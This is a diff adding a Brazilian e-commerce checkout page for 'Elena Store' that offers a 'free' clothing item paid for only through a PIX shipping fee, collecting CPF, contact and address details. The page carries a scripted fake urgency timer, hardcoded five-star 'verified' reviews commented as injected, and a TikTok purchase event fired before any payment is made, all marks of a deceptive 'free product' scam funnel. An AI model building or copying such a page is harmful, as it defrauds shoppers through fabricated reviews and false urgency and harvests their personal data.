@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout Seguro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="checkout.css">
+
+    <!-- TikTok Pixel Code Start -->
+    <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+      var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+      ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+      ttq.load('D470E4RC77U2P8MCJJR0');
+      ttq.page();
+    }(window, document, 'ttq');
+    </script>
+    <!-- TikTok Pixel Code End -->
+</head>
+<body>
+
+    <header class="header-checkout" style="flex-direction: column; gap: 5px; padding: 15px;">
+        <img src="images/logo.png" alt="Elena Store" style="height: 60px; object-fit: contain; margin-bottom: 5px;" onerror="this.style.display='none'">
+        <div style="font-size: 0.8rem; color: #15b74e; display: flex; align-items: center; gap: 5px;">
+            🔒 Ambiente 100% Seguro
+        </div>
+    </header>
+
+    <div class="timer-banner">
+        ⚠️ Suas peças estão reservadas por <span id="timerMin">14</span>:<span id="timerSec">54</span> minutos.
+    </div>
+
+    <form class="container-checkout" id="checkoutForm">
+
+        <!-- Informações Pessoais -->
+        <div class="card">
+            <div class="card-header"><span class="step">1</span> Dados da Emissão e Envio</div>
+            
+            <div class="form-group">
+                <label>E-mail *</label>
+                <input type="email" id="chkEmail" class="form-control" placeholder="seu@email.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Nome completo *</label>
+                <input type="text" id="chkNome" class="form-control" placeholder="Digite seu nome" required>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>CPF *</label>
+                    <input type="text" id="chkCpf" class="form-control" placeholder="000.000.000-00" required>
+                </div>
+                <div class="form-group">
+                    <label>Telefone / WhatsApp *</label>
+                    <input type="tel" id="chkTelefone" class="form-control" placeholder="(00) 00000-0000" required>
+                </div>
+            </div>
+            
+            <div class="form-group" style="margin-top: 10px; border-top: 1px dashed #e0e0e0; padding-top: 15px;">
+                <label>CEP *</label>
+                <input type="text" id="chkCep" class="form-control" placeholder="00000-000" required>
+            </div>
+            <div class="form-row">
+                <div class="form-group" style="flex: 2;">
+                    <label>Rua / Avenida *</label>
+                    <input type="text" id="chkRua" class="form-control" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>Número *</label>
+                    <input type="text" id="chkNumero" class="form-control" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Bairro *</label>
+                    <input type="text" id="chkBairro" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label>Cidade *</label>
+                    <input type="text" id="chkCidade" class="form-control" required>
+                </div>
+                <div class="form-group" style="flex: 0.5;">
+                    <label>UF *</label>
+                    <input type="text" id="chkEstado" class="form-control" placeholder="SP" maxlength="2" required>
+                </div>
+            </div>
+        </div>
+
+        <!-- Resumo do Pedido -->
+        <div class="card">
+            <div class="card-header"><span class="step">2</span> Resumo do Pedido</div>
+            
+            <div class="summary-item">
+                <img src="" id="chkImg" class="summary-img" alt="Produto" onerror="this.src='images/giftbox.png'">
+                <div class="summary-details">
+                    <div class="summary-title" id="chkTitle">Carregando produto...</div>
+                    <div id="chkOptions" style="font-size: 0.8rem; color: #666; margin-bottom: 6px; font-weight: 500;"></div>
+                    <div class="summary-price">TOTALMENTE GRÁTIS</div>
+                </div>
+            </div>
+
+            <!-- Frete Options -->
+            <label class="shipping-option" id="lblFrete1">
+                <input type="radio" name="freteOpt" value="1.99" class="shipping-radio">
+                <div class="shipping-info">
+                    <div class="shipping-title">Entrega Normal</div>
+                    <div class="shipping-desc">Receba em 10 a 15 dias úteis</div>
+                </div>
+                <div class="shipping-price">R$ 1,99</div>
+            </label>
+
+            <label class="shipping-option selected" id="lblFrete2">
+                <input type="radio" name="freteOpt" value="21.44" class="shipping-radio" checked>
+                <div class="shipping-info">
+                    <div class="shipping-title">Frete Expresso</div>
+                    <div class="shipping-desc">Receba em 5 a 8 dias úteis</div>
+                </div>
+                <div class="shipping-price">R$ 21,44</div>
+            </label>
+
+            <label class="shipping-option" id="lblFrete3">
+                <input type="radio" name="freteOpt" value="27.93" class="shipping-radio">
+                <div class="shipping-info">
+                    <div class="shipping-title">E-Sedex Prio</div>
+                    <div class="shipping-desc">Receba em 2 a 4 dias úteis</div>
+                </div>
+                <div class="shipping-price">R$ 27,93</div>
+            </label>
+
+            <!-- Totais -->
+            <div style="margin-top: 20px;">
+                <div class="totals-row">
+                    <span>Subtotal</span>
+                    <span>R$ 0,00</span>
+                </div>
+                <div class="totals-row">
+                    <span>Taxa de Frete</span>
+                    <span id="valorFreteVisual">R$ 21,44</span>
+                </div>
+                <div class="totals-row grand-total">
+                    <span>Total a pagar</span>
+                    <span id="valorTotalFinal">R$ 21,44</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Pagamento -->
+        <div class="card">
+            <div class="card-header"><span class="step">3</span> Pagamento Seguro</div>
+            
+            <!-- Dados Pix -->
+            <div class="payment-content active" id="tabPix">
+                <div style="text-align: center; padding: 15px; background: #f0fdf6; border-radius: 8px; border: 1px solid #71d8ab; margin-bottom: 20px;">
+                    <p style="color:#00a85f; font-weight: 600; margin-bottom: 10px;">⚡ Pagamento PIX aprovado na hora!</p>
+                    <p style="font-size: 0.85rem; color: #555;">Sua compra será aprovada em até 10 segundos para envio imediato.</p>
+                </div>
+                <div id="pixContainer" style="display: none; text-align: center; margin-bottom: 20px;">
+                    <p style="font-weight: bold; color: #333;">Escaneie o QR Code abaixo:</p>
+                    <img id="pixQrcode" src="" alt="QR Code PIX" style="max-width: 200px; margin: 15px auto;">
+                    <p style="font-weight: bold; color: #333; margin-top: 10px;">Ou copie o código:</p>
+                    <div style="display: flex; gap: 10px; margin-top: 5px;">
+                        <input type="text" id="pixCode" class="form-control" readonly style="font-size: 0.8rem; background: #f9f9f9;">
+                        <button type="button" onclick="copiarPix()" style="padding: 10px 15px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;">Copiar</button>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="btnSubmit">
+                ⚡ GERAR CÓDIGO PIX
+            </button>
+            <div class="secure-text">🔒 Suas informações financeiras são protegidas rigorosamente pela plataforma.</div>
+        </div>
+
+        <!-- Avaliações Injetadas no Checkout -->
+        <div class="reviews-section">
+            <h2 class="reviews-title">Avaliações das clientes</h2>
+            
+            <div class="review-card">
+                <div class="review-header">
+                    <div class="review-name">Fernanda Souza <span class="verified-icon">✔️</span></div>
+                    <div class="review-stars">★★★★★</div>
+                </div>
+                <div class="review-text">Adorei a peça! Chegou super rápido. Achei que poderia demorar horrores, mas levou só 6 dias para me entregarem. Perfeito!</div>
+                <div class="review-date">Há 2 dias</div>
+            </div>
+
+            <div class="review-card">
+                <div class="review-header">
+                    <div class="review-name">Juliana Mello <span class="verified-icon">✔️</span></div>
+                    <div class="review-stars">★★★★★</div>
+                </div>
+                <div class="review-text">Meninas, podem confiar, a alfaiataria é incrível e veste super bem, caimento perfeito! Vou comprar mais peças com certeza.</div>
+                <div class="review-date">Há 4 dias</div>
+            </div>
+
+            <div class="review-card">
+                <div class="review-header">
+                    <div class="review-name">Carla Nunes <span class="verified-icon">✔️</span></div>
+                    <div class="review-stars">★★★★★</div>
+                </div>
+                <div class="review-text">Sensacional! Paguei o expresso e chegou rapidinho. Super bem embalado, com cheirinho gostoso na roupa. Estão de parabéns.</div>
+                <div class="review-date">Há 1 semana</div>
+            </div>
+        </div>
+
+    </form>
+
+    <script src="produtos.js"></script>
+    <script>
+        // 1. Carregar Dados Dinâmicos do Produto
+        const urlParams = new URLSearchParams(window.location.search);
+        const prodId = parseInt(urlParams.get('id')) || 1;
+        const sizeParam = urlParams.get('size');
+        const colorParam = urlParams.get('color');
+        const imgParam = urlParams.get('img');
+        
+        const produto = typeof produtos !== 'undefined' ? (produtos.find(p => p.id === prodId) || produtos[0]) : { nome: "Produto Grátis", imagem: "images/giftbox.png" };
+        
+        document.getElementById('chkTitle').innerText = produto.nome;
+        document.getElementById('chkImg').src = imgParam ? decodeURIComponent(imgParam) : produto.imagem;
+
+        let optionsList = [];
+        if (sizeParam) optionsList.push(`Tamanho: ${sizeParam}`);
+        if (colorParam) optionsList.push(`Cor: ${colorParam}`);
+        
+        if (optionsList.length > 0) {
+            document.getElementById('chkOptions').innerText = optionsList.join(' | ');
+        } else {
+            document.getElementById('chkOptions').style.display = 'none';
+        }
+
+        // Variável de controle do frete
+        let totalVal = 21.44; 
+
+        // 2. Lógica de atualização do Frete
+        const radios = document.querySelectorAll('.shipping-radio');
+        const labels = document.querySelectorAll('.shipping-option');
+        
+        labels.forEach(label => {
+            label.addEventListener('click', () => {
+                labels.forEach(l => l.classList.remove('selected'));
+                label.classList.add('selected');
+                
+                const input = label.querySelector('input');
+                input.checked = true;
+                totalVal = parseFloat(input.value);
+                atualizarValores();
+            });
+        });
+        // 3. Atualizar e exibir totais do Frete
+        function atualizarValores() {
+            let totalExib = totalVal.toFixed(2).replace('.', ',');
+            const elVisual = document.getElementById('valorFreteVisual');
+            if(elVisual) elVisual.innerText = "R$ " + totalExib;
+            
+            const elFinal = document.getElementById('valorTotalFinal');
+            if(elFinal) elFinal.innerText = "R$ " + totalExib;
+        }
+        atualizarValores();
+
+        // TikTok Event: InitiateCheckout
+        if(typeof ttq !== 'undefined') {
+            ttq.track('InitiateCheckout', {
+                content_type: 'product',
+                content_id: String(prodId),
+                content_name: produto.nome,
+                value: totalVal,
+                currency: 'BRL',
+                quantity: 1
+            });
+        }
+
+        // 4. Interceptar Submission do Form (Apenas PIX)
+        const form = document.getElementById('checkoutForm');
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btnSubmit');
+            btn.innerHTML = "Gerando PIX...";
+            btn.disabled = true;
+
+            const totalAmountCents = Math.round(totalVal * 100);
+            const stateValue = document.getElementById('chkEstado').value.replace(/[^a-zA-Z]/g, '').toUpperCase();
+            
+            const payload = {
+                amount: totalAmountCents,
+                currency: "BRL",
+                paymentMethod: "PIX",
+                customer: {
+                    name: document.getElementById('chkNome').value,
+                    email: document.getElementById('chkEmail').value,
+                    document: {
+                        number: document.getElementById('chkCpf').value.replace(/\D/g, ''),
+                        type: "CPF"
+                    },
+                    phone: document.getElementById('chkTelefone').value.replace(/\D/g, ''),
+                    address: {
+                        street: document.getElementById('chkRua').value,
+                        zipCode: document.getElementById('chkCep').value.replace(/\D/g, ''),
+                        neighborhood: document.getElementById('chkBairro').value,
+                        city: document.getElementById('chkCidade').value,
+                        state: stateValue,
+                        country: "BR"
+                    }
+                },
+                shipping: {
+                    fee: totalAmountCents, // todo o valor é de frete já que a peça é "grátis"
+                    address: {
+                        street: document.getElementById('chkRua').value,
+                        zipCode: document.getElementById('chkCep').value.replace(/\D/g, ''),
+                        neighborhood: document.getElementById('chkBairro').value,
+                        city: document.getElementById('chkCidade').value,
+                        state: stateValue,
+                        country: "BR"
+                    }
+                },
+                items: [
+                    {
+                        title: produto.nome.substring(0, 99),
+                        unitPrice: 0,
+                        quantity: 1,
+                        tangible: true
+                    }
+                ],
+                pix: {
+                    expiresInDays: 1 // 1 dia
+                }
+            };
+
+            try {
+                const response = await fetch('/api/pix', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                const data = await response.json();
+                const transaction = data.transaction || data.data || data.result || data;
+                const transactionId = data.id || transaction.id;
+                const qrCode =
+                    data.qrCode ||
+                    transaction.qrCode ||
+                    transaction.pix?.qrCode ||
+                    data.pix?.qrCode ||
+                    transaction.pixCode ||
+                    data.pixCode ||
+                    transaction.copyPaste ||
+                    data.copyPaste ||
+                    "";
+                const qrImg =
+                    data.qrCodeBase64 ||
+                    transaction.qrCodeBase64 ||
+                    transaction.pix?.qrCodeBase64 ||
+                    data.pix?.qrCodeBase64 ||
+                    transaction.qrImage ||
+                    data.qrImage ||
+                    transaction.encodedImage ||
+                    data.encodedImage ||
+                    "";
+                
+                if (response.ok && transactionId) {
+                    // TikTok Event: CompletePayment (PIX Gerado)
+                    if(typeof ttq !== 'undefined') {
+                        ttq.track('CompletePayment', {
+                            content_type: 'product',
+                            content_id: String(prodId),
+                            content_name: produto.nome,
+                            value: totalVal,
+                            currency: 'BRL',
+                            quantity: 1
+                        });
+                    }
+
+                    localStorage.setItem('lastPixData', JSON.stringify({
+                        id: transactionId,
+                        qrCode,
+                        qrImg,
+                        rawResponse: data
+                    }));
+                    window.location.href = "pix.html";
+                } else {
+                    alert("Erro ao gerar transação: " + (data.message || JSON.stringify(data)));
+                    btn.disabled = false;
+                    btn.innerHTML = "⚡ GERAR CÓDIGO PIX";
+                }
+            } catch (err) {
+                console.error(err);
+                alert("Erro de conexão ao gerar o PIX.");
+                btn.disabled = false;
+                btn.innerHTML = "⚡ GERAR CÓDIGO PIX";
+            }
+        });
+
+        // 5. Função de copiar o PIX
+        function copiarPix() {
+            const input = document.getElementById('pixCode');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            document.execCommand("copy");
+            alert("Código PIX copiado!");
+        }
+
+        // 6. Cronômetro de Urgência
+        let time = (14 * 60) + 54;
+        const minEl = document.getElementById('timerMin');
+        const secEl = document.getElementById('timerSec');
+        setInterval(() => {
+            if(time <= 0) return;
+            time--;
+            const mins = Math.floor(time / 60);
+            const secs = time % 60;
+            minEl.innerText = mins < 10 ? '0'+mins : mins;
+            secEl.innerText = secs < 10 ? '0'+secs : secs;
+        }, 1000);
+
+    </script>
+</body>
+</html>
